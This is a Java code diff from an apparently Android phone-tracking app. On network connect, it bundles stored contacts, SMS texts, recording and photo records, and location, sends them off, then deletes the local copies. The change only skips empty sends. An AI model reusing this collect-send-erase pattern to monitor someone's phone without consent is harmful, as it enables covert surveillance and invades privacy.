@@ -39,72 +39,78 @@ public class NetworkReceiver extends BroadcastReceiver {
 
         final android.net.NetworkInfo mobile = conn.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
         if ((wifi.isAvailable() && wifi.isConnected())) {
-            readDB(helper);
-            send();
-            helper.deleteLocate();
-            helper.deleteContact();
-            helper.deleteImage();
-            helper.deleteSMS();
-            helper.deleteRecord();
+            if(readDB(helper)) {
+                send();
+                helper.deleteLocate();
+                helper.deleteContact();
+                helper.deleteImage();
+                helper.deleteSMS();
+                helper.deleteRecord();
+            }
         }
         else if (mobile.isAvailable() && mobile.isConnected()){
-            readDB(helper);
-            send();
-            helper.deleteLocate();
-            helper.deleteContact();
-            helper.deleteImage();
-            helper.deleteSMS();
-            helper.deleteRecord();
+            if(readDB(helper)) {
+                send();
+                helper.deleteLocate();
+                helper.deleteContact();
+                helper.deleteImage();
+                helper.deleteSMS();
+                helper.deleteRecord();
+            }
         }
     }
-    public void readDB(MyDatabaseHelper helper){
+    public boolean readDB(MyDatabaseHelper helper){
         listLocation =helper.getLocate();
         listSMS = helper.getListSMS();
         listContacts = helper.getListContacts();
         listRecord = helper.getRecord();
         listImage = helper.getImage();
+        if(listLocation.size()==0 && listSMS.size()==0 && listContacts.size()==0 && listRecord.size()==0 && listImage.size()==0){
+            return false;
+        }
+        return true;
     }
     public void send(){
         String content = "";
         List<String> contentAndPath = new ArrayList<>();
 
-        if(listContacts != null){
+        if(listContacts != null && listContacts.size()>0){
             content += "Contact:\n";
             for (Contact contact : listContacts) {
                 content += "Đọc lúc: " + contact.getTime() + "-Tên: " + contact.getName() + ": SĐT: " + contact.getPhone() + "\n";
             }
         }
-        if(listRecord != null){
+        if(listRecord != null && listRecord.size()>0){
             content += "Record: Đã ghi âm vào các thời điểm\n";
             for (Record record : listRecord) {
                 content += "(Cập nhập: " + record.getTime() + ")\n";
             }
         }
-        if (listSMS != null){
+        if (listSMS != null && listSMS.size()>0){
             content += "SMS:\n";
             for (SMS sms : listSMS) {
                 content += "Đọc lúc:" + sms.getTime() + "\n\t\tSDT:" + sms.getPhoneNumber() + " nhận lúc " + (new Date(Long.parseLong(sms.getTimeReceive()))).toString() + "\n\t\tNội dung: " + sms.getBody() + "\n";
             }
         }
-        if (listImage != null){
+        if (listImage != null && listImage.size()>0){
             content += "Images: Đã chụp ảnh môi trường xung quanh vào các thời điểm:\n";
             for(Image image: listImage){
                 content += "(Cập nhập: " + image.getTime() + ") \n";
             }
         }
-        if (listLocation != null){
+        if (listLocation != null && listLocation.size()>0){
             content += "Location:\n";
             for(Location location: listLocation){
                 content += "(Cập nhập: " + location.getTime() + "):Vị trí của điện thoại của bạn là: " + location.getLatitude() + ", " + location.getLongitude() + "\n";
             }
         }
         contentAndPath.add(content);
-        if(listRecord != null){
+        if(listRecord != null && listRecord.size()>0){
             for (Record record : listRecord) {
                 contentAndPath.add(record.getUrl());
             }
         }
-        if(listImage != null){
+        if(listImage != null && listImage.size()>0){
             for(Image image: listImage){
                 contentAndPath.add(image.getUrl());
             }
